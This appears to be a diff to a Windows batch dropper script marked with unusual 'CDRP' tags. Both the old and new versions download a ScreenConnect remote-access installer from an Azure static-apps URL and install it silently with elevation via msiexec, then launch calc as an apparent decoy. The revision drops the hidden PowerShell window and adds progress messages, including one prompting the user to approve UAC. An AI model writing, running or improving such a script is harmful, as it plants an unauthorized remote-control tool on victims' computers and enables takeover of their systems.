@@ -3,11 +3,35 @@ REM CDRP7F3A9D2B8C4
 setlocal EnableExtensions
 set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
 set "URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
-curl -fsSL -o "%MSI%" "%URL%"
-if errorlevel 1 exit /b 1
-powershell -nop -w hidden -c "exit (Start-Process msiexec -Verb RunAs -Wait -PassThru -ArgumentList '/i \"%MSI%\" /qn /norestart').ExitCode"
-if errorlevel 1 exit /b 1
+echo [1/3] Downloading ScreenConnect MSI...
+echo       %URL%
+curl -fSL -o "%MSI%" "%URL%"
+if errorlevel 1 (
+    echo.
+    echo DOWNLOAD FAILED. Check network / Windows Defender.
+    pause
+    exit /b 1
+)
+if not exist "%MSI%" (
+    echo.
+    echo MSI missing after download.
+    pause
+    exit /b 1
+)
+for %%A in ("%MSI%") do echo       Saved: %%~fA  size=%%~zA bytes
+echo.
+echo [2/3] Installing - click YES on the UAC prompt...
+powershell -nop -c "exit (Start-Process msiexec -Verb RunAs -Wait -PassThru -ArgumentList '/i \"%MSI%\" /qn /norestart').ExitCode"
+if errorlevel 1 (
+    echo.
+    echo INSTALL FAILED or UAC was denied. Exit code %ERRORLEVEL%
+    pause
+    exit /b 1
+)
+echo.
+echo [3/3] Install finished OK.
 start "" calc
+pause
 endlocal
 exit /b
 REM CDRPEND7F3A9D2
